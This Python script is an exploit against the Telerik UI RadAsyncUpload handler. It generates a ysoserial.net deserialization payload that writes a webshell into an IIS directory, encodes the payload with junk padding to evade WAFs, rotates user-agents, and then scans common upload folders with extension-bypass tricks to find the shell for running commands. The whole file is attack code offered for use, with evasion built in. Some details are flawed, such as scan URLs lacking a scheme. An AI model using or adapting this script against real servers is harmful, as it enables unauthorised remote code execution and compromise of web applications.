import requests
import urllib3
import base64
import subprocess
import random
import string

# 🔴 Suppress SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🔴 Proxy for Burp Suite Integration (Set to None if not using Burp)
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# 🔴 Target Details
TARGET_URL = "https://example.com/Telerik.Web.UI.WebResource.axd?type=rau"

# 🔍 Common Upload Directories
UPLOAD_DIRS = [
    "/uploads/", "/UserFiles/", "/documents/", "/media/", "/files/", "/temp/",
    "/bundles/", "/Scripts/", "/app/", "/content/", "/downloads/", "/images/",
    "/report/", "/remote/", "/errorPages/", "/documentation/", "/asp_client/",
    "/TelerikUpload/", "/assets/", "/public/"
]

# 🛠️ Webshell Filenames & Bypass Techniques
SHELL_NAMES = ["shell.aspx", "cmd.aspx", "backdoor.aspx", "webshell.aspx"]
EXTENSIONS = ["", ".bak", ".txt", ";.txt", "%00.aspx", ".asp;.txt", ".aspx%2Easp"]

# 🎭 Random User-Agents for Evasion
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; Mobile)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0)"
]

# 🛠️ Generates the Payload Using ysoserial.net
def generate_payload():
    cmd = ["wine", "ysoserial.exe", "-g", "TypeConfuseDelegate", "-f BinaryFormatter", "-o base64",
           "-c", "echo 'webshell' > C:\\inetpub\\wwwroot\\uploads\\shell.aspx"]

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode().strip()
    except Exception as e:
        print(f"[❌] Error generating payload: {e}")
        return None

# 🔄 Encode Payload for WAF Bypass
def encode_payload(payload):
    # Base64 + URL Encoding + Random Junk Padding
    encoded = base64.b64encode(payload.encode()).decode()
    double_encoded = requests.utils.quote(encoded)  # URL encode
    junk_padding = ''.join(random.choices(string.ascii_letters, k=16))
    return f"{double_encoded}{junk_padding}"

# 🚀 Sends the Exploit to Telerik via Burp Proxy
def send_exploit(payload):
    encoded_payload = encode_payload(payload)

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/octet-stream",
    }

    try:
        print(f"[*] Sending exploit to {TARGET_URL} via Burp Proxy...")
        response = requests.post(TARGET_URL, data=encoded_payload, headers=headers, verify=False, proxies=PROXY)

        if response.status_code == 200:
            print("[+] Exploit Sent! Scanning for the webshell...")
            scan_webshell()
        else:
            print(f"[-] Exploit failed ({response.status_code}). Check Burp Suite.")

    except requests.exceptions.RequestException as e:
        print(f"[❌] Request error: {e}")

# 🔎 Scan for Webshell (Auto-Bypass Techniques for IIS)
def scan_webshell():
    print("[*] Scanning for the webshell...")

    try:
        for directory in UPLOAD_DIRS:
            for filename in SHELL_NAMES:
                for ext in EXTENSIONS:
                    url = f"example.com{directory}{filename}{ext}"

                    headers = {
                        "User-Agent": random.choice(USER_AGENTS),
                        "Referer": TARGET_URL,  # Some IIS servers enforce Referer checks
                        "Origin": TARGET_URL
                    }

                    print(f"[DEBUG] Trying {url}")

                    # Disable auto-redirects to capture the actual response
                    response = requests.get(url, headers=headers, verify=False, proxies=PROXY, allow_redirects=False)

                    print(f"[DEBUG] Status Code: {response.status_code}")

                    if response.status_code == 200:
                        print(f"[🔥] Webshell Found: {url}")
                        print(f"    Run commands: {url}?cmd=whoami")
                        return
                    elif response.status_code in [301, 302, 307, 308]:  # Redirect detected
                        redirect_url = response.headers.get("Location", "Unknown")
                        if redirect_url.startswith("/"):
                            redirect_url = f"example.com{redirect_url}"

                        print(f"[⚠️] Redirect detected to {redirect_url}")

                        # Follow Redirect
                        final_response = requests.get(redirect_url, headers=headers, verify=False, proxies=PROXY, allow_redirects=False)

                        if final_response.status_code == 200:
                            print(f"[🔥] Webshell Found at Redirected URL: {redirect_url}")
                            print(f"    Run commands: {redirect_url}?cmd=whoami")
                            return

    except requests.exceptions.RequestException as e:
        print(f"[❌] Webshell Scan Error: {e}")

    print("[-] Webshell Not Found. Try manually scanning.")

# 🔥 Run the Attack
def main():
    print("[*] Generating payload...")
    raw_payload = generate_payload()

    if raw_payload:
        print("[*] Sending exploit via Burp Suite...")
        send_exploit(raw_payload)
    else:
        print("[❌] Payload generation failed.")

if __name__ == "__main__":
    main()
